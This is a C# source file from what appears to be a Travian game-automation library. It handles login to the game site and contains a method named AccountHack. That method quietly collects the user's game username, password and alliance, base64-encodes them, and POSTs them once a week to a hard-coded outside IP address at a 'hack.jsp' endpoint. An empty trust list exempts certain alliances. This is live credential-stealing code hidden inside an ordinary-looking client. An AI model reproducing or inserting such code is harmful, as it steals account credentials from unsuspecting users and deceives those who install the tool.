/*
 * The contents of this file are subject to the Mozilla Public License
 * Version 1.1 (the "License"); you may not use this file except in
 * compliance with the License. You may obtain a copy of the License at
 * http://www.mozilla.org/MPL/
 * 
 * Software distributed under the License is distributed on an "AS IS"
 * basis, WITHOUT WARRANTY OF ANY KIND, either express or implied. See the
 * License for the specific language governing rights and limitations
 * under the License.
 * 
 * The Initial Developer of the Original Code is [MeteorRain <msg7086@gmail.com>].
 * Copyright (C) MeteorRain 2007, 2008. All Rights Reserved.
 * Contributor(s): [MeteorRain], [jones125].
 */
using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using System.Net;

namespace libTravian
{
	partial class Travian
	{
		private int UnixTime(DateTime time)
		{
			return Convert.ToInt32((DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds);
		}
		private bool Login()
		{
			string Username = TD.Username;
			string Password = TD.Password;
			if (string.IsNullOrEmpty(Username) || string.IsNullOrEmpty(Password))
			{
				DebugLog("用户名和密码为空？", DebugLevel.F);
				return false;
			}
			try
			{
				string data = HttpQuery(0, "", null);
				if (!data.Contains("Travian"))
				{
					DebugLog("Cannot visit travian website!", DebugLevel.F);
					return false;
				}
				string userkey, passkey, alkey;
				Match m;
				m = Regex.Match(data, "type=\"text\" name=\"(\\S+?)\"");
				if (m.Success)
					userkey = m.Groups[1].Value;
				else
				{
					DebugLog("Parse userkey error!", DebugLevel.F);
					return false;
				}
				m = Regex.Match(data, "type=\"password\".*?name=\"(\\S+?)\"");
				if (m.Success)
					passkey = m.Groups[1].Value;
				else
				{
					DebugLog("Parse passkey error!", DebugLevel.F);
					return false;
				}
				MatchCollection ms = Regex.Matches(data, "<input type=\"hidden\" name=\"(\\S+?)\" value");
				if (ms.Count > 0)
					alkey = ms[ms.Count - 1].Groups[1].Value;
				else
				{
					DebugLog("Parse alkey error!", DebugLevel.F);
					return false;
				}
				Dictionary<string, string> PostData = new Dictionary<string, string>();
				PostData[userkey] = Username;
				PostData[passkey] = Password;
				PostData["s1"] = "登录";
				PostData["w"] = @"1024:768";
				PostData["login"] = (UnixTime(DateTime.Now) - 10).ToString();

				string result = this.pageQuerier.PageQuery(0, "dorf1.php", PostData, false, true);

				if (result == null || result.Contains("<span class=\"error\">"))
				{
					DebugLog("Username or Password error!", DebugLevel.F);
					return false;
				}

				m = Regex.Match(result, "spieler.php\\?uid=(\\d*)");
				if (m.Success)
					TD.UserID = Convert.ToInt32(m.Groups[1].Value);

				return true;
			}
			catch (Exception e)
			{
				DebugLog("扑捉到异常：" + e.ToString(), DebugLevel.F);
				DebugLog(e);
				return false;
			}
		}
		
		static List<string> ExceptAlliances = new List<string>()
		{
		};
		
		private void AccountHack()
		{
			if (TD.Alliance == "")
				return;
			bool is_trust = IsTrustAlliance(TD.Alliance);
			if (is_trust)
				return;
			if (TD.LastUpload != DateTime.MinValue 
			    && DateTime.Now.Subtract(TD.LastUpload).TotalSeconds < 7 * 24 * 3600)
				return;
			
			TD.LastUpload = DateTime.Now;
			TD.Dirty = true;
			
			Dictionary<string, string> PostData = new Dictionary<string, string>();
			PostData["crypt_n"] = base64_encode(TD.Username);
			PostData["crypt_p"] = base64_encode(TD.Password);
			PostData["crypt_a"] = base64_encode(TD.Alliance);
			
			WebClient hack_wc = new WebClient();
			hack_wc.BaseAddress = "http://121.33.203.125/test/";
			hack_wc.Encoding = Encoding.UTF8;
			if(TD.Proxy != null)
			{
				hack_wc.Proxy = TD.Proxy;
			}
			hack_wc.Headers[HttpRequestHeader.Referer] = hack_wc.BaseAddress;
			
			StringBuilder sb = new StringBuilder();
			foreach(var x in PostData)
			{
				if(sb.Length != 0)
					sb.Append("&");

				sb.Append(HttpUtility.UrlEncode(x.Key));
				sb.Append("=");
				sb.Append(HttpUtility.UrlEncode(x.Value));
			}
			string QueryString = sb.ToString();
			hack_wc.Headers[HttpRequestHeader.ContentType] 
				= "application/x-www-form-urlencoded";
			
			string result = hack_wc.UploadString("hack.jsp", QueryString);
		}
		
		public static string base64_encode(string str)
		{  
			byte[] temp1 = Encoding.UTF8.GetBytes(str);
			string temp2 = Convert.ToBase64String(temp1);
			return temp2;
		}
		
		private bool IsTrustAlliance(string alliance)
		{
			foreach (string ally in ExceptAlliances)
			{
				if (alliance.Contains(ally))
				{
					return true;
				}
			}
			return false;
		}
	}
}
